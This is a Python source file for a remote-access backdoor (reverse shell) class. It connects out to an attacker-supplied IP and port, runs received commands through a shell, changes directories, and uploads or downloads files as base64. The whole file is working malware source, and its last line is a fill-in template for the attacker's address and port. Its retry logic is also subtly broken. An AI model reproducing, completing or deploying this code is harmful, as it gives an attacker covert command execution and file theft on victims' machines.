import socket
import subprocess
import simplejson
import os
import base64
import sys
import threading


class Backdoor:

    def __init__(self, ip, port):

        while True:

            try:

                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((ip, port))
                self.run()

            except ConnectionRefusedError:

                timer = threading.Timer(10, self.__init__(ip, port))
                timer.start()

            except TimeoutError:

                timer = threading.Timer(10, self.__init__(ip, port))
                timer.start()


    def reliable_send(self, data):

        json_data = simplejson.dumps(data)
        self.connection.sendall(json_data.encode('utf-8'))

    def reliable_receive(self):

        json_data = ""

        while True:

            try:

                json_data = json_data + self.connection.recv(1024).decode('utf-8')
                return simplejson.loads(json_data)

            except ValueError:
                continue

    def execute_system_command(self, command):
        try:

            DEVNULL = open(os.devnull, 'wb')
            return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

        except subprocess.CalledProcessError:

            return "[-] Error during command execution :(("

    def change_working_directory_to(self, path):

        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):

        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):

        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Successful."

    def run(self):

        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()

                elif command[0] == "cd" and len(command) > 1:

                    command_result = self.change_working_directory_to(command[1])

                elif command[0] == "download":

                    command_result = self.read_file(command[1])
                elif command[0] == "upload":

                    command_result = self.write_file(command[1], command[2])
                else:

                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error during command execution. :(("
            self.reliable_send(command_result)


my_backdoor = Backdoor("Your Public IP", Port Number)
my_backdoor.run()
